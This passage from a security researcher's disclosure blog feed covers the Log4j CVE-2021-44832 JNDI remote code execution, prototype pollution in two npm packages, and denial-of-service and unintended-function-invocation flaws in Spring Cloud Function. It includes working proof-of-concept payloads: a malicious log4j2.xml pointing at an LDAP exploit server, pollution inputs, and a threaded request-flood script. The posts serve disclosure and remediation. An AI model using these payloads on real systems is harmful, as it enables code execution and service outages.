class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>our payload was triggered, and we executed calc.exe on the machine.<br><img src="/img/blogs/log4j2/Image-1.png" style="width: 100%;"/><br><video controls="" src="/videos/log4j2/Video-1.mov" style="width: 100%;"></video></p><p><code>DataSource dataSource = (DataSource)context.lookup(jndiName);</code></p><p>Is the line that triggers the JNDI lookup, it is in <code>DataSourceConnectionSource -&gt; createConnectionSource</code> which is called from the <code>PluginBuilder</code>. And this is also the reason for the crash since we cannot cast the object to DataSource (the crash happens after the deserialization). The lookup function will do LDAP lookup to the “RemainingName” which is the DN (what comes after the slash).</p><p>To understand the calls better, we can follow the callgraph bottom up to see who calls who:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">createConnectionSource:<span class="number">75</span>, DataSourceConnectionSource (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span><span class="selector-class">.appender</span><span class="selector-class">.db</span>.jdbc)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">498</span>, Method (java<span class="selector-class">.lang</span>.reflect)</span><br><span class="line">build:<span class="number">136</span>, PluginBuilder (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span><span class="selector-class">.config</span><span class="selector-class">.plugins</span>.util)</span><br><span class="line">createPluginObject:<span class="number">1120</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">createConfiguration:<span class="number">1045</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">createConfiguration:<span class="number">1037</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">createConfiguration:<span class="number">1037</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">doConfigure:<span class="number">651</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">initialize:<span class="number">247</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">start:<span class="number">293</span>, AbstractConfiguration (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.config)</span><br><span class="line">setConfiguration:<span class="number">626</span>, LoggerContext (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span>.core)</span><br><span class="line">reconfigure:<span class="number">699</span>, LoggerContext (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span>.core)</span><br><span class="line">reconfigure:<span class="number">716</span>, LoggerContext (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span>.core)</span><br><span class="line">start:<span class="number">270</span>, LoggerContext (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span>.core)</span><br><span class="line">getContext:<span class="number">155</span>, Log4jContextFactory (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.impl)</span><br><span class="line">getContext:<span class="number">47</span>, Log4jContextFactory (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span><span class="selector-class">.log4j</span><span class="selector-class">.core</span>.impl)</span><br><span class="line">getContext:<span class="number">196</span>, LogManager (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span>.log4j)</span><br><span class="line">getLogger:<span class="number">599</span>, LogManager (org<span class="selector-class">.apache</span><span class="selector-class">.logging</span>.log4j)</span><br><span class="line"><span class="selector-tag">main</span>:<span class="number">11</span>, log4j</span><br></pre></td></tr></table></figure><h1 id="Steps-To-Reproduce"><a href="#Steps-To-Reproduce" class="headerlink" title="Steps To Reproduce"></a>Steps To Reproduce</h1><p>For the vulnerability to be exploitable, Log4J’s configuration file needs to be loaded from an external source. This can be a remote FTP server, cloud storage etc. An attacker could use technics such as DNS poisoning and MITM in order to inject a uniquely crafted configuration file and ultimately exploit the vulnerability.</p><ol><li>Fetching Remote configuration via HTTP<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://127.0.0.1:8888/log4j2.xml&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>Using the same LDAP (Lightweight Directory Access Protocol) server as done in the CVE-2021-44228 PoC (Proof of Concept), all we need to do is to run:<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//log4j.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.configurationFile&quot;</span>,<span class="string">&quot;http://127.0.0.1:8888/log4j2.xml&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>Inject the malicious log4j2.xml file into the response:<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">JDBC</span> <span class="attr">name</span>=<span class="string">&quot;databaseAppender&quot;</span> <span class="attr">tableName</span>=<span class="string">&quot;dbo.application_log&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">DataSource</span> <span class="attr">jndiName</span>=<span class="string">&quot;ldap://127.0.0.1:1389/Exploit&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;eventDate&quot;</span> <span class="attr">isEventTimestamp</span>=<span class="string">&quot;true&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;level&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%level&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;logger&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%logger&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%message&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Column</span> <span class="attr">name</span>=<span class="string">&quot;exception&quot;</span> <span class="attr">pattern</span>=<span class="string">&quot;%ex&#123;full&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">JDBC</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;warn&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;databaseAppender&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="Expected-Results"><a href="#Expected-Results" class="headerlink" title="Expected Results"></a>Expected Results</h1><p>When initializing the logger object, a request to the remote log4j2.xml will be made. In the loading process, an attempt to load the DataSource object will make a request to the LDAP server that will then redirect to a malicious class. In the end, the arbitrary class will be deserialized and executed.</p><h1 id="Apache’s-Fix"><a href="#Apache’s-Fix" class="headerlink" title="Apache’s Fix"></a>Apache’s Fix</h1><p>On December 27th the fixing commit <a href="https://github.com/apache/logging-log4j2/commit/05db5f9527254632b59aed2a1d78a32c5ab74f16">05db5f9</a> was released. As we can see before the fix, the lookup of the DataSource was made directly with the InitialContext, which is a Java internal class.</p><img src="/img/blogs/log4j2/Image-2.jpg" style="width: 100%;"/><p>In version 2.17.1 the lookup uses the log4j’s JNDI wrapper, and thus disables the lookup. A new log4j2.enableJndiJdbc system property was added to reenable this functionality.</p><p>This is the reason why the vulnerability is exploitable using log4j’s default system properties.</p><h1 id="Why-Is-This-Interesting"><a href="#Why-Is-This-Interesting" class="headerlink" title="Why Is This Interesting?"></a>Why Is This Interesting?</h1><p>There are two main configuration scenarios when using Log4J.</p><ul><li>The configuration is on a remote location. This can be useful for developers in case of multiple products sharing the same logging configuration. In this case, an attacker could expand their control over a network by gaining access to the node that serves the configuration file, or use techniques such as MITM and DNS poisoning to inject a malicious configuration file and trigger code execution.</li><li>The configuration is a local file and is part of the repository or project. This is the case for most products in the wild. Even though this scenario is harder to leverage, an attacker could attempt to alter the configuration file by gaining access to the source code, especially if it’s an open-source project that’s maintained by a community such as GitHub. For example, an attacker could find a popular Java package that’s using Log4J, alter its configuration file, and cause a supply chain attack for developers who are using this package. <strong>Unlike changes to the code itself, configuration files tend to draw less focus and are easier to “sweep under the rug”.</strong></li></ul><h1 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h1><p>Upgrade your Apache Log4j2 to versions 2.17.1, 2.12.4, and 2.3.2 or above.</p><h1 id="Timeline-of-Disclosure"><a href="#Timeline-of-Disclosure" class="headerlink" title="Timeline of Disclosure"></a>Timeline of Disclosure</h1><table><thead><tr><th>Date</th><th>Action</th></tr></thead><tbody><tr><td>27&#x2F;12&#x2F;2021</td><td>Responsible disclosure was made to Apache.</td></tr><tr><td>27&#x2F;12&#x2F;2021</td><td>Acknowledgment received from Apache.</td></tr><tr><td>28&#x2F;12&#x2F;2021</td><td>Checkmarx customers who were using Log4J were warned, without exposing the vulnerability‘s details.</td></tr><tr><td>28&#x2F;12&#x2F;2021</td><td>CVE-2021-44832 was assigned to this issue.</td></tr><tr><td>28&#x2F;12&#x2F;2021</td><td>Fixed version 2.17.1 was released.</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;Log4j is a highly popular logg</summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="deserialization" scheme="https://yaniv-git.github.io/tags/deserialization/"/>
    
    <category term="log4j" scheme="https://yaniv-git.github.io/tags/log4j/"/>
    
    <category term="log4j2" scheme="https://yaniv-git.github.io/tags/log4j2/"/>
    
  </entry>
  
  <entry>
    <title>Prototype pollution in cloneextend</title>
    <link href="https://yaniv-git.github.io/2021/06/27/Prototype%20pollution%20in%20cloneextend/"/>
    <id>https://yaniv-git.github.io/2021/06/27/Prototype%20pollution%20in%20cloneextend/</id>
    <published>2021-06-27T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Affected versions of cloneextend (npm) are vulnerable to prototype pollution via the clone and extend functions.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>All versions of cloneextend npm package.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>If untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ce = <span class="built_in">require</span>(<span class="string">&#x27;cloneextend&#x27;</span>);</span><br><span class="line">ce.<span class="title function_">extend</span>(&#123;&#125;,<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:1&#125;&#125;&#x27;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>)</span><br><span class="line">&gt;<span class="number">1</span></span><br><span class="line"> </span><br><span class="line">ce.<span class="title function_">clone</span>(<span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;a&quot;:1&#125;&#125;&#x27;</span>))</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">a</span>)</span><br><span class="line">&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>1 will be printed to the console.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Currently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable functions.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a href="https://twitter.com/ynizry">Yaniv Nizry</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://www.npmjs.com/package/cloneextend">NPM Package</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;Affected versions of cloneextend (npm) are vulnera</summary>
      
    
    
    
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
    <category term="prototype-pollution" scheme="https://yaniv-git.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>Prototype pollution in extend2</title>
    <link href="https://yaniv-git.github.io/2021/06/27/Prototype%20pollution%20in%20extend2/"/>
    <id>https://yaniv-git.github.io/2021/06/27/Prototype%20pollution%20in%20extend2/</id>
    <published>2021-06-27T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Affected versions of extend2 (npm) are vulnerable to prototype pollution via the extend function.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>All versions of extend2 (npm).</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>If untrusted data reaches one of the affected functions, prototype pollution can be achieved. The impact will depend on the application.</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> extend = <span class="built_in">require</span>(<span class="string">&#x27;extend2&#x27;</span>);</span><br><span class="line">a = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1</span>&#125;;</span><br><span class="line"><span class="title function_">extend</span>(<span class="literal">true</span>, &#123;&#125;, a, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;polluted&quot;:1&#125;&#125;&#x27;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(&#123;&#125;.<span class="property">polluted</span>);</span><br></pre></td></tr></table></figure><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>1 will be printed to the console.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Currently no fix has been released. As a workaround, avoid passing untrusted inputs to the vulnerable function.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a href="https://twitter.com/ynizry">Yaniv Nizry</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://www.npmjs.com/package/extend2">NPM Package</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;Affected versions of extend2 (npm) are vulnerable </summary>
      
    
    
    
    
    <category term="npm" scheme="https://yaniv-git.github.io/tags/npm/"/>
    
    <category term="prototype-pollution" scheme="https://yaniv-git.github.io/tags/prototype-pollution/"/>
    
  </entry>
  
  <entry>
    <title>DoS in Spring Cloud Function</title>
    <link href="https://yaniv-git.github.io/2021/06/16/DoS%20in%20Spring%20Cloud%20Function/"/>
    <id>https://yaniv-git.github.io/2021/06/16/DoS%20in%20Spring%20Cloud%20Function/</id>
    <published>2021-06-16T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>In Spring Cloud Function versions 3.2.5 and older unsupported versions, it is possible for a user who directly interacts with framework provided lookup functionality to cause denial of service condition due to the caching issue in Function Catalog component of the framework. At the time of writing of this CVE such interaction is only possible via spring-cloud-function-web module.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>Spring Cloud Function versions before 3.2.6.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>In case the web endpoint for function invocation is open a DoS could be achieved.</p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> threading</span><br><span class="line"><span class="attribute">def</span> a():</span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">100000</span>):</span><br><span class="line"><span class="attribute">response</span> =requests.post(f<span class="string">&quot;http://host/uppercase,&quot;</span>, json=&#123;&#x27;a&#x27;:<span class="number">1</span>&#125;)</span><br><span class="line"><span class="attribute">if</span> i%<span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line"><span class="attribute">print</span>(response.elapsed.total_seconds()) </span><br><span class="line"></span><br><span class="line"><span class="attribute">for</span> i in range(<span class="number">10</span>):</span><br><span class="line"><span class="attribute">threading</span>.Thread(target=a).start()</span><br><span class="line"><span class="attribute">if</span> i ==<span class="number">9</span>:</span><br><span class="line"><span class="attribute">a</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>replace the name of the function (<code>uppercase</code>) with a function that exists</li></ul><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>The time for a response will rise and eventually crash the server.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update Spring Cloud Function to 3.2.6 or above.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a href="https://twitter.com/ynizry">Yaniv Nizry</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://tanzu.vmware.com/security/cve-2022-22979">Official advisory</a></li><li><a href="https://github.com/spring-cloud/spring-cloud-function/commit/9b6952f041ed028aba1165a55f38589ec6a93c09">Commit</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;In Spring Cloud Function versions 3.2.5 and older </summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="dos" scheme="https://yaniv-git.github.io/tags/dos/"/>
    
    <category term="denial of service" scheme="https://yaniv-git.github.io/tags/denial-of-service/"/>
    
  </entry>
  
  <entry>
    <title>Unintended function invocation in Spring Cloud Function</title>
    <link href="https://yaniv-git.github.io/2021/06/16/Unintended%20function%20invocation%20in%20Spring%20Cloud%20Function/"/>
    <id>https://yaniv-git.github.io/2021/06/16/Unintended%20function%20invocation%20in%20Spring%20Cloud%20Function/</id>
    <published>2021-06-16T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>In Spring Cloud Function it’s possible for users to invoke unintended functions that follow some arbitrary rules. In versions 3.2.6 and above a <code>spring.cloud.function.ineligible-definitions</code> configuration was introduced to mitigate the issue but it still requires the user to go over the unintended functions a user might run.</p><h2 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h2><p>Spring Cloud Function versions before 3.2.6.</p><h2 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h2><p>The impact is highly dependent on the application context, and on the worse case could lead to RCE. </p><h2 id="Steps-to-reproduce"><a href="#Steps-to-reproduce" class="headerlink" title="Steps to reproduce"></a>Steps to reproduce</h2><ol><li>Run the  following main function: <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">public</span> static <span class="type">void</span> main(String[] args) &#123;</span><br><span class="line">Collection registeredBeans = <span class="built_in">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">ApplicationContext context = SpringApplication.run(DemoApplication.<span class="keyword">class</span>, args);</span><br><span class="line">FunctionCatalog catalog = context.getBean(FunctionCatalog.<span class="keyword">class</span>);</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;Num of Beans: &quot; + context.getBeanDefinitionNames().length);</span><br><span class="line"><span class="keyword">for</span> (String functionName : context.getBeanDefinitionNames())</span><br><span class="line">&#123;</span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">SimpleFunctionRegistry.FunctionInvocationWrapper <span class="keyword">function</span> = (SimpleFunctionRegistry.FunctionInvocationWrapper)catalog.lookup(functionName);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">function</span> != <span class="keyword">null</span>)</span><br><span class="line">&#123;</span><br><span class="line">registeredBeans.<span class="keyword">add</span>(functionName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">catch (<span class="keyword">Exception</span> e)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(&quot;Num of registered functions: &quot; + registeredBeans.size());</span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(registeredBeans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>The output will list all of the functions a user can call, there will be more than the application’s intention.</li></ol><h3 id="Expected-result"><a href="#Expected-result" class="headerlink" title="Expected result:"></a>Expected result:</h3><p>Unintended functions could be executed, the impact could vary.</p><h2 id="Remediation"><a href="#Remediation" class="headerlink" title="Remediation"></a>Remediation</h2><p>Update Spring Cloud Function to 3.2.6 or above, and use the configuration spring.cloud.function.ineligible-definitions to exclude unintended functions.</p><h2 id="Credit"><a href="#Credit" class="headerlink" title="Credit"></a>Credit</h2><p>This issue was discovered and reported by Checkmarx SCA Security Researcher <a href="https://twitter.com/ynizry">Yaniv Nizry</a>.</p><h2 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h2><ol><li><a href="https://github.com/spring-cloud/spring-cloud-function/commit/1381cd4e6d04961d028683d2226242c01d7397ab">Commit</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h2&gt;&lt;p&gt;In Spring Cloud Function it’s possible for users t</summary>
      
    
    
    
    
    <category term="java" scheme="https://yaniv-git.github.io/tags/java/"/>
    
    <category term="function" scheme="https://yaniv-git.github.io/tags/function/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-33420: NPM Replicator Remote Code Execution Deserialization</title>
    <link href="https://yaniv-git.github.io/2021/06/13/NPM%20Replicator%20Remote%20Code%20Execution%20Deserialization/"/>
    <id>https://yaniv-git.github.io/2021/06/13/NPM%20Replicator%20Remote%20Code%20Execution%20Deserialization/</id>
    <published>2021-06-13T22:00:00.000Z</published>
    <updated>2023-12-03T11:51:13.869Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>NPM, the package manager for Node.js, is an open source project that serves as a critical part of the JavaScript community and helps support one of the largest developer ecosystems. According to its <a href="https://www.npmjs.com/">website</a>, “npm is relied upon by more than 11 million developers worldwide. The free npm registry has become the center of JavaScript code sharing, and with more than one million packages, is the largest software registry in the world.”</p><p>Given the breadth of the npm universe and the Checkmarx Security Research Team’s always-on curiosity into performing investigations into open source projects and uncovering 0-days, we recently conducted an npm-focused vulnerability workshop. As a result of our efforts, we discovered an interesting remote code execution (RCE) deserialization issue in the npm <a href="https://www.npmjs.com/package/replicator">Replicator</a> package.</p><h1 id="Impact-Summary"><a href="#Impact-Summary" class="headerlink" title="Impact Summary"></a>Impact Summary</h1><p>Deserialization of any untrusted input in the npm Replicator package, which sees more than 200,000 downloads per week, could lead to remote code execution and full compromise of the 